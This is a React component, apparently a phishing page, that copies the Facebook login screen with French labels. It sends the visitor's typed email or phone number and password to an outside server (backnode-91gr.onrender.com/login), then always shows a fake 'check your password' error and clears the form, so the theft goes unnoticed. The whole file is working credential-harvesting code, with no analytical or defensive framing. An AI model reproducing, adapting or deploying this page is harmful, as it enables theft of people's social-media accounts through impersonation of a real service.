import React from 'react';
import { useState } from 'react';
import { Spinner } from "react-bootstrap";
import { Container, Row, Col, Form, Button } from "react-bootstrap";
import axios from 'axios';
import "bootstrap/dist/css/bootstrap.min.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';


const Connexion = () => {
  const [nom, setNom] = useState("");
  const [mdp, setMdp] = useState("");
  const [loading, setLoading] = useState(false);

  const miova = (e) => {
    setMdp(e.target.value);
  }



  const mampiditra = async (req, res, error) => {
    if (mdp === "" || nom === "") {
      toast.error('Veuillez remplir les champs vide', {
        position: "top-center",
        autoClose: 2000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      }); return;
    } else {
      setLoading(true); // Activation de l'état de chargement

      try {
        const alefa = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp })
          .then((response) => {
            toast.error('Vérifier votre mot de passe ou votre numéro téléphone', {
              position: "top-center",
              autoClose: 3000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
            });
            setNom("");
            setMdp("");
          })
          .catch((error) => {
            console.log(error);
          })
          .finally(() => {
            setLoading(false);
          });
      } catch (error) {
        setLoading(false);
      }
    }
  };









  return (
      <div style={{ background: "#f0f2f5", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div style={{ background: "white", padding: "4rem", width: "500px", borderRadius: "10px" }}>
        <Container>
          <div className="text-center">
            <p style={{ color: "blue", fontSize: "3em" }}>facebook</p>
          </div>
          <Row className="justify-content-center">
            <Col md={8}>
              <Form>
                <Form.Group controlId="formBasicNom">
                  <Form.Control
                    type="text"
                    placeholder="Adresse e-mail ou numéro de téléphone"
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem" }}
                  />
                </Form.Group>
                <Form.Group controlId="formBasicPassword">
                  <Form.Control
                    type="password"
                    placeholder="Mot de passe"
                    value={mdp}
                    onChange={(e) => setMdp(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem", margin: "0 auto" }}
                  />
                </Form.Group>
                <div className="text-center">
                  <Button
                    variant="primary"
                    style={{ width: "100%", marginBottom: "1rem" }}
                    onClick={mampiditra}
                    block
                    disabled={loading}
                  >
                    {loading ? (
                      <Spinner animation="border" size="sm" />
                    ) : (
                      "Se connecter"
                    )}
                  </Button>
                  <br />
                  <p style={{ color: "blue", cursor: "pointer" }}>Mot de passe oublié ?</p>
                  <hr />
                  <Button
                    variant="success"
                    style={{ width: "100%", marginBottom: "1rem" }}
                    onClick={mampiditra}
                    block
                    disabled={loading}
                  >
                    {loading ? (
                      <Spinner animation="border" size="sm" />
                    ) : (
                      "Créer un nouveau compte"
                    )}
                  </Button>
                </div>
              </Form>
            </Col>
          </Row>
        </Container>
      </div>
    </div>

  );
};

export default Connexion;
